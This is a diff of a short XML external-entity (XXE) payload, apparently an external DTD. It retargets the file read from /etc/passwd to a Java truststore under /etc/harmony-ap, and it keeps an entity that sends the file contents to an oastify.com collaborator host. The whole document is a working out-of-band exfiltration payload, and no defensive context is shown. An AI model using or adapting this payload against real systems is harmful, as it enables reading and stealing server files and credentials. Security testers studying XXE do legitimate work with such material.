@@ -1,5 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///etc/harmony-ap/ap-truststore.jks">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://rwr73gjiz73q8znfqgfntkhcv31uplu9j.oastify.com/pwned?data=%file;'>">
 %eval;
 %exfil;
- 
